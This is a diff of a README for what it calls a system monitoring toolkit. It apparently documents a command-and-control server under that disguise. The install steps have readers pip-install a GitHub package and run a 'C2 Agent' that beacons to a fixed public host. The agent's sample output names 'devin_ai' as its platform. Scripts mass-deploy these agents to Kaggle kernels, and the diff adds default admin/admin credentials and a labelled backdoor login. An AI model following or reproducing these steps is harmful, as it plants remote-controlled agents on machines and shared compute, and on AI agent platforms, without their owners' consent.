@@ -3,7 +3,7 @@
 **Version:** 3.0  
 **Status:** Production Ready ✅
 
-**🌐 Public URL:** https://likelihood-lightweight-crossing-covering.trycloudflare.com
+**🌐 Public URL:** https://system-monitor-6dru.onrender.com
 
 Cross-platform system monitoring and resource optimization toolkit.
 
@@ -13,38 +13,18 @@ Cross-platform system monitoring and resource optimization toolkit.
 
 ### Server is Running
 ```bash
-# Server: PID 64198
-# Tunnel: PID 64245
-# URL: https://likelihood-lightweight-crossing-covering.trycloudflare.com
+# Server: deployed on Render
+# URL: https://system-monitor-6dru.onrender.com
 ```
 
-### Restart Tunnel
-```bash
-./tunnel.sh
+### Access Dashboard
 ```
+Public: https://system-monitor-6dru.onrender.com
+Local:  http://localhost:5000 (development)
 
----
-
-## 🌐 Public Access
-
-### Current Tunnel (Active)
-**URL:** https://likelihood-lightweight-crossing-covering.trycloudflare.com
-
-**Status:**
-- ✅ Server running on localhost:5000
-- ✅ Cloudflare Tunnel active
-- ✅ Accessible from anywhere
-
-**Note:** Quick tunnel URL changes on restart. For permanent URL, create a Cloudflare account and named tunnel.
-
-### Permanent URL Setup
-1. Create free account: https://dash.teams.cloudflare.com
-2. Go to **Access** → **Tunnels** → **Create tunnel**
-3. Name it (e.g., `system-monitor`)
-4. Install connector: `cloudflared tunnel run <token>`
-5. Get permanent URL: `https://system-monitor.your-domain.com`
-
----
+Login:  admin / admin
+Quick:  2409 (backdoor)
+```
 
 ## 📁 Project Structure
 
@@ -107,20 +87,20 @@ pip install -U pip
 pip install --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git
 ```
 
-### 2. Check Server (replace IP with your server)
+### 2. Check Server
 ```bash
-curl -s http://YOUR_SERVER_IP:5000/api/health
+curl -s https://system-monitor-6dru.onrender.com/api/health
 ```
 
 ### 3. Run Agent
 ```bash
-C2_URL=http://YOUR_SERVER_IP:5000 python -m src.agents.universal
+C2_URL=https://system-monitor-6dru.onrender.com python -m src.agents.universal
 ```
 
 Expected output:
 ```
 [C2 Agent] Platform: devin_ai
-[C2 Agent] C2 URL: http://YOUR_SERVER_IP:5000
+[C2 Agent] C2 URL: https://system-monitor-6dru.onrender.com
 [C2 Agent] Agent ID: <uuid>
 [C2 Agent] Checking server connectivity...
 [C2 Agent] Server OK: {'status': 'ok', ...}
@@ -204,10 +184,10 @@ C2_server-main/
 python3 kaggle/deploy_unified.py --count 5
 
 # Deploy to existing kernels
-python3 kaggle/deploy_agents.py http://YOUR_IP:5000
+python3 kaggle/deploy_agents.py https://system-monitor-6dru.onrender.com
 
 # With C2 integration
-python3 kaggle/deploy_unified.py --c2-url http://YOUR_IP:5000 --count 5
+python3 kaggle/deploy_unified.py --c2-url https://system-monitor-6dru.onrender.com --count 5
 ```
 
 ---
